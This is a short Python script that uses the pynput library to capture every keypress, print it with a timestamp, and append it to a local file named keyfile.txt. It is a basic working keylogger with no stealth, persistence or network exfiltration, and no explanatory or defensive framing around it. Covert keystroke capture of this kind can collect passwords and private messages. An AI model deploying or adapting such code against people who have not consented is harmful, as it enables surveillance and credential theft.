from pynput import keyboard
import datetime

def keyPressed(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{timestamp} - {str(key)}")
    with open("keyfile.txt", 'a') as logKey:
        try:
            if hasattr(key, 'char'):  
                char = key.char
            else:
                char = str(key)
            logKey.write(f"{timestamp} - {char}\n")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
